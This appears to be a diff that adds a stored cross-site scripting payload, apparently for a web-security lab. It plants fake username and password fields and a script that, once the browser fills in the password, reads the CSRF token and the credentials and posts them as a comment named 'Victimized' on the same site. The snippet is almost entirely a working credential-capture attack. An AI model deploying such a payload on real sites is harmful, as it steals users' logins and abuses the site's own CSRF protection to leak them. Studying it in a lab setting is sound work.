@@ -1,0 +1,25 @@
+
+<input type="text" name="username" id="username" >
+<input type="password" name="password"  onchange="fillPassword()">
+
+<script>
+    function fillPassword() {
+        var csrfToken = document.getElementsByName('csrf')[0].value;
+        var username = document.getElementsByName('username')[0].value;
+        var password =  document.getElementsByName('password')[0].value;
+
+        var formData = new FormData();
+        formData.append('csrf', csrfToken);
+        formData.append('postId', '8');
+        formData.append('comment', `${username} : ${password}`)
+        formData.append('name', 'Victimized');
+        formData.append('email', 'bee@mail.com');
+        formData.append('webiste', 'https://example.com');
+
+        fetch('/post/comment', {
+            method: 'POST',
+            mode: 'no-cors',
+            body: formData
+        })
+    }
+</script>
